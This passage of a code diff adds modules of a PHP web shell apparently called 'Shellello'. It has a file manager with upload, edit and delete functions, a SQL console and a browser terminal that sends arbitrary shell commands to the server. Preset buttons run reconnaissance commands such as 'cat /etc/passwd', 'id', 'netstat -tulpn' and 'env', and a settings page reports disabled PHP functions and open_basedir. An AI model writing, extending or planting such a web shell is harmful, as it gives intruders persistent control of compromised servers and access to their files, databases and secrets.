+            </div>
+            <div class="modal-footer">
+                <button class="btn btn-secondary" onclick="closeModal('editorModal')">Cancel</button>
+                <button class="btn btn-primary" onclick="saveFile()">💾 Save</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- New File Modal -->
+    <div class="modal-overlay" id="newFileModal">
+        <div class="modal">
+            <div class="modal-header">
+                <h3>Create New File</h3>
+                <button class="modal-close" onclick="closeModal('newFileModal')">&times;</button>
+            </div>
+            <div class="modal-body">
+                <label>File Name:</label>
+                <input type="text" id="newFileName" class="form-control" placeholder="filename.txt">
+            </div>
+            <div class="modal-footer">
+                <button class="btn btn-secondary" onclick="closeModal('newFileModal')">Cancel</button>
+                <button class="btn btn-primary" onclick="createFile()">Create</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- New Folder Modal -->
+    <div class="modal-overlay" id="newFolderModal">
+        <div class="modal">
+            <div class="modal-header">
+                <h3>Create New Folder</h3>
+                <button class="modal-close" onclick="closeModal('newFolderModal')">&times;</button>
+            </div>
+            <div class="modal-body">
+                <label>Folder Name:</label>
+                <input type="text" id="newFolderName" class="form-control" placeholder="folder-name">
+            </div>
+            <div class="modal-footer">
+                <button class="btn btn-secondary" onclick="closeModal('newFolderModal')">Cancel</button>
+                <button class="btn btn-primary" onclick="createFolder()">Create</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Rename Modal -->
+    <div class="modal-overlay" id="renameModal">
+        <div class="modal">
+            <div class="modal-header">
+                <h3>Rename</h3>
+                <button class="modal-close" onclick="closeModal('renameModal')">&times;</button>
+            </div>
+            <div class="modal-body">
+                <input type="hidden" id="renameOldPath">
+                <label>New Name:</label>
+                <input type="text" id="renameNewName" class="form-control">
+            </div>
+            <div class="modal-footer">
+                <button class="btn btn-secondary" onclick="closeModal('renameModal')">Cancel</button>
+                <button class="btn btn-primary" onclick="renameItem()">Rename</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Upload Modal -->
+    <div class="modal-overlay" id="uploadModal">
+        <div class="modal">
+            <div class="modal-header">
+                <h3>Upload File</h3>
+                <button class="modal-close" onclick="closeModal('uploadModal')">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="upload-zone" onclick="document.getElementById('uploadFile').click()">
+                    <input type="file" id="uploadFile" style="display:none" onchange="updateFileName()">
+                    <p>📤 Click to select file</p>
+                    <p class="text-muted" id="uploadFileName">No file selected</p>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button class="btn btn-secondary" onclick="closeModal('uploadModal')">Cancel</button>
+                <button class="btn btn-primary" onclick="uploadFile()">Upload</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Delete Modal -->
+    <div class="modal-overlay" id="deleteModal">
+        <div class="modal">
+            <div class="modal-header">
+                <h3>⚠️ Confirm Delete</h3>
+                <button class="modal-close" onclick="closeModal('deleteModal')">&times;</button>
+            </div>
+            <div class="modal-body">
+                <input type="hidden" id="deletePath">
+                <p>Delete <strong id="deleteItemName"></strong>?</p>
+                <p class="text-danger">This cannot be undone.</p>
+            </div>
+            <div class="modal-footer">
+                <button class="btn btn-secondary" onclick="closeModal('deleteModal')">Cancel</button>
+                <button class="btn btn-danger" onclick="deleteItem()">Delete</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+var currentPath = <?php echo json_encode($currentPath); ?>;
+var editingFile = null;
+
+document.addEventListener('DOMContentLoaded', loadFiles);
+
+function loadFiles() {
+    fetch('?action=list_files&path=' + encodeURIComponent(currentPath))
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            if (data.status === 'success') {
+                currentPath = data.path;
+                document.getElementById('currentPath').value = currentPath;
+                renderFiles(data.data);
+            } else {
+                toast(data.message, 'error');
+            }
+        });
+}
+
+function renderFiles(files) {
+    var tbody = document.getElementById('fileList');
+    if (!files.length) {
+        tbody.innerHTML = '<tr><td colspan="5" class="text-center text-muted">Empty</td></tr>';
+        return;
+    }
+    var html = '';
+    for (var i = 0; i < files.length; i++) {
+        var f = files[i];
+        var isDir = f.type === 'dir';
+        var icon = f.name === '..' ? '⬆️' : (isDir ? '📁' : '📄');
+        var cls = isDir ? 'file-name dir' : 'file-name';
+        var dbl = isDir ? 
+            'navigateTo(\'' + esc(currentPath + '/' + f.name) + '\')' : 
+            'editFile(\'' + esc(currentPath + '/' + f.name) + '\')';
+        var acts = f.name === '..' ? '' : 
+            '<button class="action-btn" onclick="event.stopPropagation();showRename(\'' + esc(currentPath + '/' + f.name) + '\',\'' + esc(f.name) + '\')">✏️</button>' +
+            (isDir ? '' : '<button class="action-btn" onclick="event.stopPropagation();download(\'' + esc(currentPath + '/' + f.name) + '\')">⬇️</button>') +
+            '<button class="action-btn danger" onclick="event.stopPropagation();showDelete(\'' + esc(currentPath + '/' + f.name) + '\',\'' + esc(f.name) + '\')">🗑️</button>';
+        html += '<tr ondblclick="' + dbl + '">' +
+            '<td><span class="file-icon">' + icon + '</span><span class="' + cls + '">' + esc(f.name) + '</span></td>' +
+            '<td class="text-muted">' + f.size + '</td>' +
+            '<td><code>' + f.perms + '</code></td>' +
+            '<td class="text-muted">' + f.modified + '</td>' +
+            '<td class="action-btns">' + acts + '</td></tr>';
+    }
+    tbody.innerHTML = html;
+}
+
+function esc(s) {
+    return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
+}
+
+function navigateTo(path) { currentPath = path; loadFiles(); }
+function goUp() {
+    var parts = currentPath.split('/');
+    if (parts.length > 1) { parts.pop(); currentPath = parts.join('/') || '/'; loadFiles(); }
+}
+function goToPath() {
+    var input = document.getElementById('currentPath');
+    input.readOnly = false; input.focus(); input.select();
+    input.onblur = function() { input.readOnly = true; currentPath = input.value; loadFiles(); };
+    input.onkeydown = function(e) { if (e.key === 'Enter') input.blur(); };
+}
+function refreshFiles() { loadFiles(); toast('Refreshed'); }
+
+function editFile(path) {
+    fetch('?action=read_file&path=' + encodeURIComponent(path))
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            if (data.status === 'success') {
+                editingFile = path;
+                document.getElementById('editorTitle').textContent = 'Edit: ' + path.split('/').pop();
+                document.getElementById('fileEditor').value = data.content;
+                showModal('editorModal');
+            } else { toast(data.message, 'error'); }
+        });
+}
+
+function saveFile() {
+    var fd = new FormData();
+    fd.append('path', editingFile);
+    fd.append('content', document.getElementById('fileEditor').value);
+    fetch('?action=save_file', {method:'POST', body:fd})
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            toast(data.message, data.status);
+            if (data.status === 'success') closeModal('editorModal');
+        });
+}
+
+function createFile() {
+    var name = document.getElementById('newFileName').value.trim();
+    if (!name) { toast('Enter file name', 'error'); return; }
+    var fd = new FormData();
+    fd.append('path', currentPath);
+    fd.append('name', name);
+    fetch('?action=create_file', {method:'POST', body:fd})
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            toast(data.message, data.status);
+            if (data.status === 'success') { closeModal('newFileModal'); loadFiles(); }
+        });
+}
+
+function createFolder() {
+    var name = document.getElementById('newFolderName').value.trim();
+    if (!name) { toast('Enter folder name', 'error'); return; }
+    var fd = new FormData();
+    fd.append('path', currentPath);
+    fd.append('name', name);
+    fetch('?action=create_folder', {method:'POST', body:fd})
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            toast(data.message, data.status);
+            if (data.status === 'success') { closeModal('newFolderModal'); loadFiles(); }
+        });
+}
+
+function showRename(path, name) {
+    document.getElementById('renameOldPath').value = path;
+    document.getElementById('renameNewName').value = name;
+    showModal('renameModal');
+}
+
+function renameItem() {
+    var fd = new FormData();
+    fd.append('old_path', document.getElementById('renameOldPath').value);
+    fd.append('new_name', document.getElementById('renameNewName').value.trim());
+    fetch('?action=rename_item', {method:'POST', body:fd})
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            toast(data.message, data.status);
+            if (data.status === 'success') { closeModal('renameModal'); loadFiles(); }
+        });
+}
+
+function showDelete(path, name) {
+    document.getElementById('deletePath').value = path;
+    document.getElementById('deleteItemName').textContent = name;
+    showModal('deleteModal');
+}
+
+function deleteItem() {
+    var fd = new FormData();
+    fd.append('path', document.getElementById('deletePath').value);
+    fetch('?action=delete_item', {method:'POST', body:fd})
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            toast(data.message, data.status);
+            if (data.status === 'success') { closeModal('deleteModal'); loadFiles(); }
+        });
+}
+
+function download(path) { window.location = '?action=download_file&path=' + encodeURIComponent(path); }
+
+function updateFileName() {
+    var file = document.getElementById('uploadFile').files[0];
+    document.getElementById('uploadFileName').textContent = file ? file.name : 'No file selected';
+}
+
+function uploadFile() {
+    var file = document.getElementById('uploadFile').files[0];
+    if (!file) { toast('Select a file', 'error'); return; }
+    var fd = new FormData();
+    fd.append('path', currentPath);
+    fd.append('file', file);
+    fetch('?action=upload_file', {method:'POST', body:fd})
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            toast(data.message, data.status);
+            if (data.status === 'success') { closeModal('uploadModal'); loadFiles(); }
+        });
+}
+
+function showModal(id) { document.getElementById(id).classList.add('show'); }
+function closeModal(id) { document.getElementById(id).classList.remove('show'); }
+
+function toast(msg, type) {
+    var t = document.getElementById('toast');
+    if (!t) {
+        t = document.createElement('div');
+        t.id = 'toast';
+        t.style.cssText = 'position:fixed;bottom:2rem;right:2rem;padding:1rem 1.5rem;border-radius:8px;color:#fff;font-weight:500;z-index:9999;transition:all 0.3s;';
+        document.body.appendChild(t);
+    }
+    t.textContent = msg;
+    t.style.background = type === 'error' ? '#ef4444' : '#22c55e';
+    t.style.opacity = '1';
+    setTimeout(function() { t.style.opacity = '0'; }, 3000);
+}
+</script>
+<?php
+    $content = ob_get_clean();
+    renderLayout('File Manager', $content, 'files');
+}
+
+// ========== 09_DATABASE ==========
+/**
+ * Shellello - Module 09: Database Page
+ */
+
+function renderDatabase() {
+    $isConnected = isset($_SESSION['db']);
+    $dbInfo = $isConnected ? $_SESSION['db'] : null;
+    
+    ob_start();
+?>
+<style>
+.form-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+    gap: 1.25rem;
+}
+.form-group { display: flex; flex-direction: column; }
+.form-group label { margin-bottom: 0.5rem; font-weight: 500; font-size: 0.9rem; }
+.form-actions { margin-top: 1.5rem; padding-top: 1.5rem; border-top: 1px solid #e5e7eb; }
+.connection-info {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 1rem 1.5rem !important;
+    background: linear-gradient(135deg, #ecfdf5 0%, #d1fae5 100%);
+    border: 1px solid #a7f3d0;
+}
+.connection-status { display: flex; align-items: center; gap: 0.75rem; }
+.status-dot {
+    width: 10px; height: 10px;
+    background: #22c55e;
+    border-radius: 50%;
+    animation: pulse 2s infinite;
+}
+@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.5} }
+.current-db {
+    background: #22c55e; color: white;
+    padding: 0.25rem 0.75rem;
+    border-radius: 20px;
+    font-size: 0.85rem;
+}
+.db-layout {
+    display: grid;
+    grid-template-columns: 280px 1fr;
+    gap: 1.5rem;
+    margin-top: 1.5rem;
+}
+.db-sidebar { padding: 0 !important; overflow: hidden; }
+.sidebar-section { padding: 1rem; border-bottom: 1px solid #e5e7eb; }
+.sidebar-section:last-child { border-bottom: none; }
+.sidebar-section h4 {
+    margin: 0 0 0.75rem 0;
+    font-size: 0.85rem;
+    color: #6b7280;
+    text-transform: uppercase;
+}
+.item-list { max-height: 200px; overflow-y: auto; }
+.table-item {
+    padding: 0.5rem 0.75rem;
+    border-radius: 6px;
+    cursor: pointer;
+    font-size: 0.9rem;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+}
+.table-item:hover { background: #f3f4f6; }
+.table-item.active { background: #fef3c7; color: #d97706; }
+.sql-editor {
+    width: 100%;
+    height: 120px;
+    font-family: 'Consolas', monospace;
+    font-size: 0.95rem;
+    padding: 1rem;
+    border: 1px solid #e5e7eb;
+    border-radius: 8px;
+    background: #1e293b;
+    color: #e2e8f0;
+    resize: vertical;
+}
+.query-actions { display: flex; align-items: center; gap: 0.75rem; margin-top: 1rem; }
+.query-status { margin-left: auto; font-size: 0.85rem; color: #6b7280; }
+.result-count {
+    margin-left: auto;
+    font-size: 0.85rem;
+    background: #f3f4f6;
+    padding: 0.25rem 0.75rem;
+    border-radius: 20px;
+}
+.table-wrapper { overflow-x: auto; max-height: 400px; overflow-y: auto; }
+#resultsTable { font-size: 0.9rem; }
+#resultsTable th { position: sticky; top: 0; background: #f8fafc; z-index: 10; }
+#resultsTable td { max-width: 300px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.card-header { display: flex; align-items: center; gap: 0.75rem; margin-bottom: 1rem; padding-bottom: 1rem; border-bottom: 1px solid #e5e7eb; }
+.card-header h3 { margin: 0; font-size: 1.1rem; }
+.card-icon { font-size: 1.5rem; }
+</style>
+
+<div class="database-manager">
+<?php if (!$isConnected): ?>
+    <div class="card">
+        <div class="card-header">
+            <span class="card-icon">🔌</span>
+            <h3>Database Connection</h3>
+        </div>
+        <div class="card-body">
+            <form id="dbForm" onsubmit="connectDb(event)">
+                <div class="form-grid">
+                    <div class="form-group">
+                        <label>Database Type</label>
+                        <select id="dbDriver" class="form-control" onchange="updatePort()">
+                            <option value="mysql">MySQL / MariaDB</option>
+                            <option value="pgsql">PostgreSQL</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>Host</label>
+                        <input type="text" id="dbHost" class="form-control" value="localhost" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Port</label>
+                        <input type="text" id="dbPort" class="form-control" value="3306">
+                    </div>
+                    <div class="form-group">
+                        <label>Username</label>
+                        <input type="text" id="dbUser" class="form-control" placeholder="root" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Password</label>
+                        <input type="password" id="dbPass" class="form-control">
+                    </div>
+                    <div class="form-group">
+                        <label>Database (optional)</label>
+                        <input type="text" id="dbName" class="form-control" placeholder="Leave empty to select later">
+                    </div>
+                </div>
+                <div class="form-actions">
+                    <button type="submit" class="btn btn-primary" id="connectBtn">🔗 Connect</button>
+                </div>
+            </form>
+        </div>
+    </div>
+<?php else: ?>
+    <div class="card connection-info">
+        <div class="connection-status">
+            <span class="status-dot"></span>
+            <span>Connected to <strong><?php echo htmlspecialchars($dbInfo['driver'] . '://' . $dbInfo['host'] . ':' . $dbInfo['port']); ?></strong></span>
+            <?php if (!empty($dbInfo['dbname'])): ?>
+                <span class="current-db">📦 <?php echo htmlspecialchars($dbInfo['dbname']); ?></span>
+            <?php endif; ?>
+        </div>
+        <button class="btn btn-danger btn-sm" onclick="disconnectDb()">Disconnect</button>
+    </div>
+
+    <div class="db-layout">
+        <div class="db-sidebar card">
+            <div class="sidebar-section">
+                <h4>📋 Tables</h4>
+                <div id="tableList" class="item-list">
+                    <div class="text-muted">Loading...</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="db-main">
+            <div class="card">
+                <div class="card-header">
+                    <span class="card-icon">⚡</span>
+                    <h3>SQL Query</h3>
+                </div>
+                <div class="card-body">
+                    <textarea id="sqlQuery" class="sql-editor" placeholder="SELECT * FROM users LIMIT 10;"></textarea>
+                    <div class="query-actions">
+                        <button class="btn btn-primary" onclick="runQuery()">▶️ Execute</button>
+                        <button class="btn btn-secondary" onclick="clearQuery()">🗑️ Clear</button>
+                        <span id="queryStatus" class="query-status"></span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card" id="resultsCard" style="display:none;">
+                <div class="card-header">
+                    <span class="card-icon">📊</span>
+                    <h3>Results</h3>
+                    <span id="resultCount" class="result-count"></span>
+                </div>
+                <div class="card-body">
+                    <div class="table-wrapper">
+                        <table id="resultsTable">
+                            <thead id="resultsHead"></thead>
+                            <tbody id="resultsBody"></tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+<?php endif; ?>
+</div>
+
+<script>
+function updatePort() {
+    var d = document.getElementById('dbDriver');
+    if (d) document.getElementById('dbPort').value = d.value === 'mysql' ? '3306' : '5432';
+}
+
+function connectDb(e) {
+    e.preventDefault();
+    var btn = document.getElementById('connectBtn');
+    btn.disabled = true;
+    btn.textContent = '⏳ Connecting...';
+    
+    var fd = new FormData();
+    fd.append('driver', document.getElementById('dbDriver').value);
+    fd.append('host', document.getElementById('dbHost').value);
+    fd.append('port', document.getElementById('dbPort').value);
+    fd.append('user', document.getElementById('dbUser').value);
+    fd.append('pass', document.getElementById('dbPass').value);
+    fd.append('dbname', document.getElementById('dbName').value);
+    
+    fetch('?action=db_connect', {method:'POST', body:fd})
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            if (data.status === 'success') {
+                toast('Connected!', 'success');
+                setTimeout(function() { location.reload(); }, 500);
+            } else {
+                toast(data.message, 'error');
+                btn.disabled = false;
+                btn.textContent = '🔗 Connect';
+            }
+        });
+}
+
+function disconnectDb() {
+    fetch('?action=db_disconnect')
+        .then(function() { location.reload(); });
+}
+
+<?php if ($isConnected): ?>
+document.addEventListener('DOMContentLoaded', loadTables);
+
+function loadTables() {
+    fetch('?action=db_tables')
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            var list = document.getElementById('tableList');
+            if (data.status === 'success' && data.tables && data.tables.length) {
+                list.innerHTML = data.tables.map(function(t) {
+                    return '<div class="table-item" onclick="selectTable(\'' + t + '\')"><span>📋</span> ' + t + '</div>';
+                }).join('');
+            } else {
+                list.innerHTML = '<div class="text-muted">No tables</div>';
+            }
+        });
+}
+
+function selectTable(t) {
+    document.querySelectorAll('.table-item').forEach(function(el) { el.classList.remove('active'); });
+    event.target.closest('.table-item').classList.add('active');
+    document.getElementById('sqlQuery').value = 'SELECT * FROM ' + t + ' LIMIT 50;';
+}
+
+function runQuery() {
+    var sql = document.getElementById('sqlQuery').value.trim();
+    if (!sql) { toast('Enter a query', 'error'); return; }
+    
+    var status = document.getElementById('queryStatus');
+    status.textContent = 'Executing...';
+    status.style.color = '#3b82f6';
+    
+    var fd = new FormData();
+    fd.append('sql', sql);
+    var start = Date.now();
+    
+    fetch('?action=db_query', {method:'POST', body:fd})
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            var elapsed = ((Date.now() - start) / 1000).toFixed(3);
+            if (data.status === 'success') {
+                if (data.data) {
+                    showResults(data.data);
+                    status.textContent = elapsed + 's';
+                    status.style.color = '#22c55e';
+                    document.getElementById('resultCount').textContent = data.count + ' rows';
+                } else {
+                    document.getElementById('resultsCard').style.display = 'none';
+                    status.textContent = (data.affected || 0) + ' rows affected';
+                    status.style.color = '#22c55e';
+                }
+            } else {
+                status.textContent = 'Error';
+                status.style.color = '#ef4444';
+                toast(data.message, 'error');
+            }
+        });
+}
+
+function showResults(data) {
+    var card = document.getElementById('resultsCard');
+    var thead = document.getElementById('resultsHead');
+    var tbody = document.getElementById('resultsBody');
+    
+    if (!data.length) {
+        thead.innerHTML = '';
+        tbody.innerHTML = '<tr><td class="text-muted">No results</td></tr>';
+        card.style.display = 'block';
+        return;
+    }
+    
+    var cols = Object.keys(data[0]);
+    thead.innerHTML = '<tr>' + cols.map(function(c) { return '<th>' + c + '</th>'; }).join('') + '</tr>';
+    tbody.innerHTML = data.map(function(row) {
+        return '<tr>' + cols.map(function(c) {
+            var v = row[c] === null ? 'NULL' : String(row[c]);
+            return '<td title="' + v.replace(/"/g, '&quot;') + '">' + v + '</td>';
+        }).join('') + '</tr>';
+    }).join('');
+    card.style.display = 'block';
+}
+
+function clearQuery() {
+    document.getElementById('sqlQuery').value = '';
+    document.getElementById('queryStatus').textContent = '';
+    document.getElementById('resultsCard').style.display = 'none';
+}
+<?php endif; ?>
+
+function toast(msg, type) {
+    var t = document.getElementById('toast');
+    if (!t) {
+        t = document.createElement('div');
+        t.id = 'toast';
+        t.style.cssText = 'position:fixed;bottom:2rem;right:2rem;padding:1rem 1.5rem;border-radius:8px;color:#fff;font-weight:500;z-index:9999;transition:opacity 0.3s;';
+        document.body.appendChild(t);
+    }
+    t.textContent = msg;
+    t.style.background = type === 'error' ? '#ef4444' : '#22c55e';
+    t.style.opacity = '1';
+    setTimeout(function() { t.style.opacity = '0'; }, 3000);
+}
+</script>
+<?php
+    $content = ob_get_clean();
+    renderLayout('Database', $content, 'database');
+}
+
+// ========== 10_TERMINAL ==========
+/**
+ * Shellello - Module 10: Terminal Page
+ */
+
+function renderTerminal() {
+    $cwd = getcwd();
+    $user = get_current_user();
+    $hostname = php_uname('n');
+    
+    ob_start();
+?>
+<style>
+.terminal-card { padding: 0 !important; overflow: hidden; background: #0d1117; }
+.terminal-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 0.75rem 1rem;
+    background: #161b22;
+    border-bottom: 1px solid #30363d;
+}
+.terminal-title { display: flex; align-items: center; gap: 0.5rem; }
+.terminal-dot { width: 12px; height: 12px; border-radius: 50%; }
+.terminal-dot.red { background: #ff5f56; }
+.terminal-dot.yellow { background: #ffbd2e; }
+.terminal-dot.green { background: #27c93f; }
+.terminal-title-text { margin-left: 0.75rem; color: #8b949e; font-size: 0.85rem; }
+.terminal-body {
+    height: 450px;
+    overflow-y: auto;
+    padding: 1rem;
+    font-family: 'Consolas', 'Monaco', monospace;
+    font-size: 0.9rem;
+    line-height: 1.6;
+    color: #c9d1d9;
+}
+.terminal-welcome { color: #58a6ff; margin-bottom: 1rem; }
+.terminal-welcome pre { margin: 0; font-size: 0.8rem; }
+.terminal-line { margin-bottom: 0.25rem; }
+.terminal-line .prompt { color: #7ee787; }
+.terminal-line .command { color: #f0f6fc; }
+.terminal-line .output { color: #8b949e; white-space: pre-wrap; word-break: break-all; }
+.terminal-line .error { color: #f85149; }
+.terminal-line .info { color: #58a6ff; }
+.terminal-input-container {
+    display: flex;
+    align-items: center;
+    padding: 0.75rem 1rem;
+    background: #161b22;
+    border-top: 1px solid #30363d;
+}
+.terminal-prompt {
+    color: #7ee787;
+    font-family: 'Consolas', monospace;
+    font-size: 0.9rem;
+    margin-right: 0.5rem;
+    white-space: nowrap;
+}
+.terminal-input {
+    flex: 1;
+    background: transparent;
+    border: none;
+    color: #f0f6fc;
+    font-family: 'Consolas', monospace;
+    font-size: 0.9rem;
+    outline: none;
+}
+.quick-cmd-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+    gap: 0.5rem;
+}
+.quick-cmd {
+    padding: 0.5rem 0.75rem;
+    background: #f3f4f6;
+    border: 1px solid #e5e7eb;
+    border-radius: 6px;
+    font-family: 'Consolas', monospace;
+    font-size: 0.85rem;
+    cursor: pointer;
+    text-align: center;
+}
+.quick-cmd:hover { background: #e5e7eb; }
+.card-header { display: flex; align-items: center; gap: 0.75rem; margin-bottom: 1rem; padding-bottom: 1rem; border-bottom: 1px solid #e5e7eb; }
+.card-header h3 { margin: 0; font-size: 1.1rem; }
+.card-icon { font-size: 1.5rem; }
+</style>
+
+<div class="terminal-container">
+    <div class="card terminal-card">
+        <div class="terminal-header">
+            <div class="terminal-title">
+                <span class="terminal-dot red"></span>
+                <span class="terminal-dot yellow"></span>
+                <span class="terminal-dot green"></span>
+                <span class="terminal-title-text">Terminal - <?php echo htmlspecialchars($hostname); ?></span>
+            </div>
+            <button class="btn btn-sm btn-secondary" onclick="clearTerm()">Clear</button>
+        </div>
+        <div class="terminal-body" id="termOutput">
+            <div class="terminal-welcome">
+                <pre>╔═══════════════════════════════════════════════════════════╗
+║  <?php echo str_pad(APP_NAME . ' Terminal v' . APP_VERSION, 55); ?> ║
+║  Type 'help' for available commands                       ║
+╚═══════════════════════════════════════════════════════════╝</pre>
+            </div>
+        </div>
+        <div class="terminal-input-container">
+            <span class="terminal-prompt" id="termPrompt"><?php echo htmlspecialchars($user . '@' . $hostname . ':' . $cwd); ?>$</span>
+            <input type="text" id="termInput" class="terminal-input" placeholder="Enter command..." autofocus autocomplete="off">
+        </div>
+    </div>
+
+    <div class="card" style="margin-top: 1.5rem;">
+        <div class="card-header">
+            <span class="card-icon">⚡</span>
+            <h3>Quick Commands</h3>
+        </div>
+        <div class="card-body">
+            <div class="quick-cmd-grid">
+                <button class="quick-cmd" onclick="runCmd('whoami')">whoami</button>
+                <button class="quick-cmd" onclick="runCmd('id')">id</button>
+                <button class="quick-cmd" onclick="runCmd('pwd')">pwd</button>
+                <button class="quick-cmd" onclick="runCmd('ls -la')">ls -la</button>
+                <button class="quick-cmd" onclick="runCmd('uname -a')">uname -a</button>
+                <button class="quick-cmd" onclick="runCmd('cat /etc/passwd')">cat /etc/passwd</button>
+                <button class="quick-cmd" onclick="runCmd('ps aux')">ps aux</button>
+                <button class="quick-cmd" onclick="runCmd('netstat -tulpn')">netstat -tulpn</button>
+                <button class="quick-cmd" onclick="runCmd('df -h')">df -h</button>
+                <button class="quick-cmd" onclick="runCmd('free -m')">free -m</button>
+                <button class="quick-cmd" onclick="runCmd('cat /etc/os-release')">OS Info</button>
+                <button class="quick-cmd" onclick="runCmd('env')">env</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+var cwd = <?php echo json_encode($cwd); ?>;
+var cmdHistory = [];
+var histIdx = -1;
+var user = <?php echo json_encode($user); ?>;
+var hostname = <?php echo json_encode($hostname); ?>;
+
+document.addEventListener('DOMContentLoaded', function() {
+    var input = document.getElementById('termInput');
+    
+    input.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') {
+            var cmd = this.value.trim();
+            if (cmd) {
+                execCmd(cmd);
+                cmdHistory.unshift(cmd);
+                histIdx = -1;
+            }
+            this.value = '';
+        } else if (e.key === 'ArrowUp') {
+            e.preventDefault();
+            if (histIdx < cmdHistory.length - 1) {
+                histIdx++;
+                this.value = cmdHistory[histIdx];
+            }
+        } else if (e.key === 'ArrowDown') {
+            e.preventDefault();
+            if (histIdx > 0) {
+                histIdx--;
+                this.value = cmdHistory[histIdx];
+            } else {
+                histIdx = -1;
+                this.value = '';
+            }
+        } else if (e.ctrlKey && e.key === 'l') {
+            e.preventDefault();
+            clearTerm();
+        }
+    });
+    
+    document.getElementById('termOutput').addEventListener('click', function() {
+        input.focus();
+    });
+});
+
+function execCmd(cmd) {
+    addLine(getPrompt(), cmd, 'command');
+    
+    if (cmd === 'clear') { clearTerm(); return; }
+    if (cmd === 'help') { showHelp(); return; }
+    if (cmd.startsWith('cd ')) { changeDir(cmd.substring(3).trim()); return; }
+    
+    var fd = new FormData();
+    fd.append('cmd', cmd);
+    fd.append('cwd', cwd);
+    
+    fetch('?action=exec_cmd', {method:'POST', body:fd})
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            if (data.status === 'success') {
+                if (data.output) addLine('', data.output, 'output');
+                if (data.cwd && data.cwd !== cwd) {
+                    cwd = data.cwd;
+                    updatePrompt();
+                }
+            } else {
+                addLine('', data.message, 'error');
+            }
+            scrollDown();
+        });
+}
+
+function changeDir(dir) {
+    var fd = new FormData();
+    fd.append('cmd', 'cd ' + dir + ' && pwd');
+    fd.append('cwd', cwd);
+    
+    fetch('?action=exec_cmd', {method:'POST', body:fd})
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            if (data.status === 'success' && data.output) {
+                cwd = data.output.trim();
+                updatePrompt();
+            } else {
+                addLine('', 'cd: ' + dir + ': No such directory', 'error');
+            }
+            scrollDown();
+        });
+}
+
+function getPrompt() { return user + '@' + hostname + ':' + cwd + '$'; }
+function updatePrompt() { document.getElementById('termPrompt').textContent = getPrompt(); }
+
+function addLine(prompt, text, type) {
+    var out = document.getElementById('termOutput');
+    var line = document.createElement('div');
+    line.className = 'terminal-line';
+    var html = '';
+    if (prompt) html += '<span class="prompt">' + esc(prompt) + '</span> ';
+    html += '<span class="' + type + '">' + esc(text) + '</span>';
+    line.innerHTML = html;
+    out.appendChild(line);
+}
+
+function showHelp() {
+    var help = 'Available commands:\n  help     - Show this help\n  clear    - Clear screen\n  cd <dir> - Change directory\n  [cmd]    - Execute shell command\n\nKeyboard:\n  Up/Down  - Command history\n  Ctrl+L   - Clear screen';
+    addLine('', help, 'info');
+    scrollDown();
+}
+
+function clearTerm() { document.getElementById('termOutput').innerHTML = ''; }
+function scrollDown() {
+    var out = document.getElementById('termOutput');
+    out.scrollTop = out.scrollHeight;
+}
+
+function runCmd(cmd) {
+    document.getElementById('termInput').value = cmd;
+    execCmd(cmd);
+}
+
+function esc(s) {
+    var div = document.createElement('div');
+    div.textContent = s;
+    return div.innerHTML;
+}
+</script>
+<?php
+    $content = ob_get_clean();
+    renderLayout('Terminal', $content, 'terminal');
+}
+
+// ========== 11_SETTINGS ==========
+/**
+ * Shellello - Module 11: Settings Page
+ */
+
+function renderSettings() {
+    $phpInfo = [
+        'Version' => phpversion(),
+        'SAPI' => php_sapi_name(),
+        'OS' => PHP_OS,
+        'Max Execution Time' => ini_get('max_execution_time') . 's',
+        'Memory Limit' => ini_get('memory_limit'),
+        'Upload Max Filesize' => ini_get('upload_max_filesize'),
+        'Post Max Size' => ini_get('post_max_size'),
+        'Display Errors' => ini_get('display_errors') ? 'On' : 'Off',
+        'Open Basedir' => ini_get('open_basedir') ?: 'None',
+        'Disabled Functions' => ini_get('disable_functions') ?: 'None'
+    ];
+    
+    $extensions = get_loaded_extensions();
+    sort($extensions);
+    
+    ob_start();
+?>
+<style>
+.config-grid { display: grid; gap: 0.75rem; }
+.config-item {
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-start;
+    padding: 0.75rem;
+    background: #f8fafc;
+    border-radius: 8px;
+    gap: 1rem;
+}
+.config-label { font-weight: 500; color: #374151; white-space: nowrap; }
+.config-value {
+    color: #6b7280;
+    text-align: right;
+    word-break: break-all;
+    font-family: 'Consolas', monospace;
+    font-size: 0.9rem;
+}
